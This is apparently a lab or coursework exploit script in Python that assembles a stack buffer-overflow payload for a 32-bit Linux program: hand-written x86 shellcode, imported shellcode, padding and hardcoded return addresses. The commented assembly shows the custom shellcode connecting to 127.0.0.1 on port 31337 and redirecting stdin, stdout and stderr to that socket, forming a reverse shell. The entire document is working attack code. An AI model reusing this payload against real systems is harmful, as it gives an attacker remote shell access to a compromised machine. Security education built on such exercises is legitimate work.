from struct import pack
from shellcode import shellcode

myshellcode = ("\x55\x89\xe5\x83\xec\x28\xb8\xfd\xff\xff\xff\xf7\xd0\x89\x45\xf4\xb8\xfe\xff\xff\xff\xf7\xd0\x89\x45\xf8\x31\xc0\x89\x45\xfc\xb8\xfe\xff\xff\xff\xf7\xd0\x89\xc3\xb8\x99\xff\xff\xff\xf7\xd0\x8d\x4d\xf4\xcd\x80\x89\x45\xe8\x8d\x45\xdc\x89\x45\xec\xb8\xef\xff\xff\xff\xf7\xd0\x89\x45\xf0\xb8\xfd\xff\xff\xff\xf7\xd0\x66\x89\x45\xdc\xb8\x80\xff\xff\xfe\xf7\xd0\x89\x45\xe0\xb8\x85\x96\xff\xff\xf7\xd0\x66\x89\x45\xde\xb8\xfc\xff\xff\xff\xf7\xd0\x89\xc3\xb8\x99\xff\xff\xff\xf7\xd0\x89\xc0\x8d\x4d\xe8\xcd\x80\x31\xc0\xb0\x3f\x8b\x5d\xe8\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80")

print(myshellcode + shellcode + "\xaa"*1872 + pack("<I", 0xbffe9ec8) + pack("<I", 0xbffea6dc))

# .global _start
# .section .text

# _start:

# push	%ebp
# mov		%esp,%ebp
# sub		$40, %esp

# # parameters for socket(2)
# movl 	$-3, %eax		# Load 2 into eax
# not 	%eax
# movl	%eax, -12(%ebp) # AF_INET
# movl 	$-2, %eax		# Load 1 into eax
# not 	%eax
# movl	%eax, -8(%ebp) 	# SOCK_STREAM
# xor 	%eax, %eax 		# Load 0 into eax
# movl	%eax, -4(%ebp)

# # invoke socketcall
# movl 	$-2, %eax		# Load 1 into eax
# not 	%eax
# movl	%eax, %ebx      # socket
# movl 	$-103, %eax		# Load 102 into eax
# not 	%eax			# socketcall
# leal 	-12(%ebp), %ecx # address of parameter array
# int 	$0x80

# # parameters for connect(3)
# mov 	%eax, -24(%ebp) # sockfd
# lea 	-36(%ebp), %eax
# mov 	%eax, -20(%ebp) # &addr
# movl	$-17, %eax 		# Load 16 into eax
# not		%eax
# movl 	%eax, -16(%ebp) # sizeof(sockaddr_in)

# # pushl $0x0101017f // Anything on 127 subnet is local, so use 127.1.1.1 for no 0 bytes
# # pushw $0x697a // The port we want (31337)

# # populate addr
# movl 	$-3, %eax			# Load 2 into eax
# not 	%eax
# movw 	%ax, -36(%ebp)		# AF_INET
# movl 	$-16777344, %eax	# Load 16777343 into eax -16777344
# not 	%eax
# movl 	%eax, -32(%ebp) 	# SERV_HOST_ADDR = 127.0.0.1 (16777343 is integer output of inet_addr(127.0.0.1))
# movl 	$-27003, %eax	 	# Load 27002 into eax
# not 	%eax
# movw 	%ax, -34(%ebp)   	# SERV_TCP_PORT = 31337 (27002 in network byte order)

# # invoke socketcall
# movl 	$-4, %eax		# Load 3 into eax
# not 	%eax
# movl 	%eax, %ebx      # connect
# movl 	$-103, %eax		# Load 102 into eax
# not 	%eax
# movl 	%eax, %eax      # socketcall
# lea 	-24(%ebp), %ecx # address of parameter array
# int 	$0x80

# # Redirect stdin
# xor %eax, %eax
# movb $63, %al
# movl -24(%ebp), %ebx
# xor %ecx, %ecx
# int $0x80

# # Redirect stdout
# xor %eax, %eax
# movb $63, %al
# movb $1, %cl
# int $0x80

# # Redirect stderr
# xor %eax, %eax
# movb $63, %al
# movb $2, %cl
# int $0x80
